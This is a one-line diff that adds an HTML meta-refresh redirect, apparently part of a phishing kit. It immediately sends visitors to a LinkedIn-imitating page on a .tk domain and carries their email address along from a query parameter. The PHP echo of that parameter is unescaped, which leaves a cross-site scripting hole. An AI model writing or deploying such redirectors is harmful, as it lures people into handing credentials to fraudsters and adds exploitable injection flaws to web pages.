@@ -1,0 +1,1 @@
+<meta http-equiv="REFRESH" content="0; http://30-grny.tk/secure/SapLinked/LinkedIn/index.php?userid=<?php echo $_GET['email']; ?>">
